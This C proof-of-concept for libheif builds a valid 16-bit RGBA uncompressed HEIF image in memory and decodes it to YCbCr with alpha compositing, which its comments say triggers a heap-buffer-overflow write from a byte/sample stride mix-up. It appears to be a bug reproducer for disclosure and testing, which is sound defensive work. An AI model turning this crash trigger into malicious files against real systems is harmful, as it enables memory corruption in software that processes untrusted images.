/*
 * PoC: decode a spec-conformant uncompressed ('unci') HEIF image that carries
 * an alpha channel into a YCbCr target while alpha compositing is enabled --
 * the code path an application takes when the output format cannot store
 * alpha (this is what heif-dec does when writing a JPEG).
 *
 * The input file is a well-formed 64x64 planar 4:4:4 image with R, G, B and
 * alpha components, every component 16 bit, big-endian samples, stored in an
 * idat box. Only ordinary API calls are made.
 *
 * Expected behaviour: the alpha channel is composited onto the colour planes
 * and the result is converted to YCbCr 4:4:4.
 *
 * Actual behaviour on the patched tree: the composited 16-bit samples are
 * written through a stride that was left in bytes instead of samples, so
 * every row past the middle of the plane lands outside the allocation.
 * AddressSanitizer aborts with a heap-buffer-overflow WRITE in
 * Op_flatten_alpha_plane<uint16_t>::convert_colorspace().
 *
 * Build:  cc -I libheif/api pocs/residual.c -o residual -L <build>/libheif -lheif
 * Run:    LD_LIBRARY_PATH=<build>/libheif ./residual
 */

#include <stdio.h>
#include <string.h>

#include "libheif/heif.h"

#define WIDTH 64
#define HEIGHT 64


/* ---------- minimal ISOBMFF append writer ---------- */

static unsigned char g_buf[65536];
static size_t g_len = 0;

static void put8(unsigned v) { g_buf[g_len++] = (unsigned char)v; }

static void put16(unsigned v) {
  g_buf[g_len++] = (unsigned char)(v >> 8);
  g_buf[g_len++] = (unsigned char)v;
}

static void put32(unsigned long v) {
  g_buf[g_len++] = (unsigned char)(v >> 24);
  g_buf[g_len++] = (unsigned char)(v >> 16);
  g_buf[g_len++] = (unsigned char)(v >> 8);
  g_buf[g_len++] = (unsigned char)v;
}

static void put4cc(const char* fourcc) {
  memcpy(g_buf + g_len, fourcc, 4);
  g_len += 4;
}

/* Remember where a box's size field is, write the header + payload, patch size. */
static size_t box_begin(const char* type) {
  size_t size_field = g_len;
  put32(0); /* patched by box_end() */
  put4cc(type);
  return size_field;
}

static void box_end(size_t size_field) {
  unsigned long size = g_len - size_field;
  g_buf[size_field + 0] = (unsigned char)(size >> 24);
  g_buf[size_field + 1] = (unsigned char)(size >> 16);
  g_buf[size_field + 2] = (unsigned char)(size >> 8);
  g_buf[size_field + 3] = (unsigned char)size;
}


static size_t build_file(void) {
  size_t b;

  /* ftyp */
  b = box_begin("ftyp");
  put4cc("mif1"); put32(0); put4cc("mif1"); put4cc("heic");
  box_end(b);

  /* meta (full box) */
  b = box_begin("meta");
  put32(0); /* version + flags */

  /* hdlr */
  {
    size_t h = box_begin("hdlr");
    put32(0);          /* version + flags */
    put32(0);          /* pre_defined */
    put4cc("pict");    /* handler_type */
    put32(0); put32(0); put32(0); /* reserved */
    put8(0);           /* empty name */
    box_end(h);
  }

  /* pitm */
  {
    size_t p = box_begin("pitm");
    put32(0);          /* version + flags */
    put16(1);          /* item_ID */
    box_end(p);
  }

  /* iinf { infe } */
  {
    size_t iinf = box_begin("iinf");
    put32(0);          /* version + flags */
    put16(1);          /* entry_count */
    {
      size_t infe = box_begin("infe");
      put32(0x02000000); /* version 2 + flags */
      put16(1);          /* item_ID */
      put16(0);          /* item_protection_index */
      put4cc("unci");    /* item_type */
      put8(0);           /* item_name (empty) */
      box_end(infe);
    }
    box_end(iinf);
  }

  /* iprp { ipco { ispe, cmpd, uncC }, ipma } */
  {
    size_t iprp = box_begin("iprp");

    size_t ipco = box_begin("ipco");

    {
      size_t ispe = box_begin("ispe");
      put32(0);        /* version + flags */
      put32(WIDTH);
      put32(HEIGHT);
      box_end(ispe);
    }

    {
      size_t cmpd = box_begin("cmpd");
      put32(4);        /* component_count */
      put16(4);        /* red */
      put16(5);        /* green */
      put16(6);        /* blue */
      put16(7);        /* alpha */
      box_end(cmpd);
    }

    {
      size_t uncC = box_begin("uncC");
      put32(0);        /* version + flags */
      put32(0);        /* profile (v0: general profile) */
      put32(4);        /* component_count */
      for (unsigned idx = 0; idx < 4; idx++) {
        put16(idx);    /* component_index */
        put8(15);      /* component_bit_depth_minus_one -> 16 bit */
        put8(0);       /* component_format: unsigned */
        put8(0);       /* component_align_size */
      }
      put8(0);         /* sampling_type: no subsampling (4:4:4) */
      put8(0);         /* interleave_type: component (planar) */
      put8(0);         /* block_size */
      put8(0);         /* flags */
      put32(0);        /* pixel_size */
      put32(0);        /* row_align_size */
      put32(0);        /* tile_align_size */
      put32(0);        /* num_tile_cols_minus_one */
      put32(0);        /* num_tile_rows_minus_one */
      box_end(uncC);
    }

    box_end(ipco);

    {
      size_t ipma = box_begin("ipma");
      put32(0);        /* version + flags */
      put32(1);        /* entry_count */
      put16(1);        /* item_ID 1 */
      put8(3);         /* association_count */
      put8(0x80 | 1);  /* essential: ispe */
      put8(0x80 | 2);  /* essential: cmpd */
      put8(0x80 | 3);  /* essential: uncC */
      box_end(ipma);
    }

    box_end(iprp);
  }

  /* idat: planar image data, R then G then B then alpha (16 bit each) */
  size_t idat = box_begin("idat");
  for (int plane = 0; plane < 4; plane++) {
    for (int y = 0; y < HEIGHT; y++) {
      for (int x = 0; x < WIDTH; x++) {
        unsigned v;
        switch (plane) {
          case 0: v = 0x1000u + (unsigned)x + WIDTH * (unsigned)y; break; /* R */
          case 1: v = 0x2000u + (unsigned)x + WIDTH * (unsigned)y; break; /* G */
          case 2: v = 0x3000u + (unsigned)x + WIDTH * (unsigned)y; break; /* B */
          default: v = 0x8000u; break;                                    /* A */
        }
        put16(v);
      }
    }
  }
  size_t tile_data_size = g_len - idat - 8;
  box_end(idat);

  /* iloc (version 1): item 1 stored in the idat above */
  {
    size_t iloc = box_begin("iloc");
    put32(0x01000000);       /* version 1 + flags */
    put16((4 << 12) | (4 << 8)); /* offset_size=4, length_size=4, base_offset_size=0 */
    put16(1);                /* item_count */
    put16(1);                /* item_ID */
    put16(0x0001);           /* construction_method: idat */
    put16(0);                /* data_reference_index */
    put16(1);                /* extent_count */
    put32(0);                /* extent_offset (within idat) */
    put32(tile_data_size);   /* extent_length */
    box_end(iloc);
  }

  box_end(b); /* meta */
  return g_len;
}


int main(void) {
  size_t size = build_file();

  heif_context* ctx = heif_context_alloc();
  if (!ctx) { fprintf(stderr, "heif_context_alloc failed\n"); return 1; }

  heif_error err = heif_context_read_from_memory_without_copy(ctx, g_buf, size, NULL);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "read failed (%d/%d): %s\n", err.code, err.subcode, err.message);
    return 1;
  }

  heif_image_handle* handle = NULL;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "no primary image (%d/%d): %s\n", err.code, err.subcode, err.message);
    return 1;
  }

  printf("image %dx%d, has alpha: %d\n",
         heif_image_handle_get_width(handle),
         heif_image_handle_get_height(handle),
         heif_image_handle_has_alpha_channel(handle));

  heif_decoding_options* options = heif_decoding_options_alloc();
  heif_color_conversion_options_ext* ext = heif_color_conversion_options_ext_alloc();
  ext->alpha_composition_mode = heif_alpha_composition_mode_solid_color;
  ext->background_red = 0xFFFF;
  ext->background_green = 0xFFFF;
  ext->background_blue = 0xFFFF;
  options->color_conversion_options_ext = ext;

  heif_image* img = NULL;
  err = heif_decode_image(handle, &img, heif_colorspace_YCbCr, heif_chroma_444, options);
  printf("decode: code=%d sub=%d msg=%s\n", err.code, err.subcode,
         err.message ? err.message : "(null)");

  int rc = 0;
  if (err.code != heif_error_Ok || img == NULL) {
    fprintf(stderr, "decode did not succeed\n");
    rc = 1;
  }
  else {
    printf("decoded to colorspace %d, chroma %d, alpha left: %d\n",
           (int)heif_image_get_colorspace(img),
           (int)heif_image_get_chroma_format(img),
           heif_image_has_channel(img, heif_channel_Alpha));
    heif_image_release(img);
  }

  heif_color_conversion_options_ext_free(ext);
  heif_decoding_options_free(options);
  heif_image_handle_release(handle);
  heif_context_free(ctx);

  if (rc == 0) {
    printf("PoC completed without a crash (alpha was composited into YCbCr)\n");
  }
  return rc;
}
